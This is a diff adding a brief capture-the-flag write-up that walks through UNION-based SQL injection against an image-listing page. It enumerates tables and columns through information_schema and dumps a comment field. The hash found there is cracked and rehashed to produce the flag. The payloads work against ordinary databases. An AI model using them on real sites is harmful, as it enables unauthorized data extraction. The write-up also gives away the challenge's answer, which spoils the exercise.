@@ -1,0 +1,11 @@
+1- to get all the tables in the database:
+    5 UNION SELECT TABLE_SCHEMA,TABLE_NAME FROM information_schema.tables
+    we know now that list_images table is in Member_images
+2- to know all the columns of the list_images table:
+    5 UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns
+
+4- 5 UNION SELECT url,comment FROM Member_images.list_images
+
+5- we decrypt the md5 string and it gives albatroz after lowering all the chars and then encrypting using SH256 we get the flag
+
+
